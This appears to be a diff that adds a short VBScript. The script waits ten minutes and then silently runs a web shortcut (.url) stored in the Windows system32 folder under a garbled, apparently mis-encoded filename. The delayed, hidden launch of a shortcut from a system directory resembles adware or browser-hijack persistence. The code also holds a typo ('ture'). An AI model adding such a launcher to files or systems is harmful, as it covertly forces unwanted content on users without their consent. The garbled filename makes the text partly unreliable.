@@ -1,0 +1,2 @@
+wscript.sleep 600000
+CreateObject("WScript.Shell").run "C:\Windows\system32\ËÑÍø.url" ,x,ture
